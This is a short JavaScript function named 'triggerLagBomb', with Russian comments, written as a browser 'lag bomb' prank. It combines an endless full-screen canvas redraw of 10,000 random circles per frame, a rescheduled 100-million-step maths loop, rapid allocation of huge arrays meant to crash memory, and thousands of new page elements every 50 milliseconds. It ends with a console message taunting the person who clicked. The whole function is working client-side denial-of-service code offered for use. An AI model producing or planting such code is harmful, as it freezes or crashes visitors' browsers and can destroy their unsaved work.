function triggerLagBomb() {
    // Анимации на канвасе
    let canvas = document.createElement("canvas");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    document.body.appendChild(canvas);
    let ctx = canvas.getContext("2d");

    function drawChaos() {
        ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        for (let i = 0; i < 10000; i++) {
            ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, ${Math.random()})`;
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 20, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(drawChaos);
    }
    drawChaos();

    // Жесткие вычисления
    function mathHell() {
        let x = 0;
        for (let i = 0; i < 100000000; i++) { // 100 миллионов
            x += Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.pow(Math.random(), 15);
        }
        setTimeout(mathHell, 0);
    }
    mathHell();

    // Утечки памяти
    function memoryCrash() {
        let trash = [];
        for (let i = 0; i < 50000; i++) {
            trash.push(new Array(10000).fill(Math.random().toString().repeat(500)));
        }
        console.log("MEMORY CRASH: " + trash.length);
        setTimeout(memoryCrash, 1);
    }
    memoryCrash();

    // Ещё анимации
    setInterval(() => {
        for (let i = 0; i < 5000; i++) {
            let div = document.createElement("div");
            div.className = "lagTrigger";
            div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
            div.style.left = `${Math.random() * window.innerWidth}px`;
            div.style.top = `${Math.random() * window.innerHeight}px`;
            document.body.appendChild(div);
        }
    }, 50);

    console.log("Кликнул? Теперь держись, братан! Лаги уровня бога активированы!");
}
